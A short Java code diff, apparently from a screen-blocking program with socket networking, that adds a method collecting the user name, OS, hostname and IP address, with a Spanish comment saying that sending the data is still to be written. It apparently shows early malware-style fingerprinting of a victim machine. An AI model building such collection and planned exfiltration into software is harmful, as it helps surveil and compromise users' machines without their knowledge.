@@ -4,6 +4,7 @@ import bloqueo.FrameBlocked;
 import java.io.DataInputStream;
 import java.io.IOException;
 import java.io.RandomAccessFile;
+import java.net.Inet4Address;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.Timer;
@@ -33,7 +34,23 @@ FrameBlocked pantallaInicio=new FrameBlocked();
         
     }
     
-    public void nuveoArchivo(String mensaje,byte info[])
+    public void info(){
+        String[] datos=new String [4];
+        
+        try {
+            datos[0]=System.getProperty("user.name");
+            datos[1]=System.getProperty("os.name");
+            datos[2]=Inet4Address.getLocalHost().getHostName();
+            datos[3]=Inet4Address.getLocalHost().getHostAddress();
+            
+            System.out.println("Datos obtenidos");
+            
+            //Falta envío de información
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    public void nuevoArchivo(String mensaje,byte info[])
     {
         try {
             RandomAccessFile zip=new RandomAccessFile("MyZip.zip", "rw");
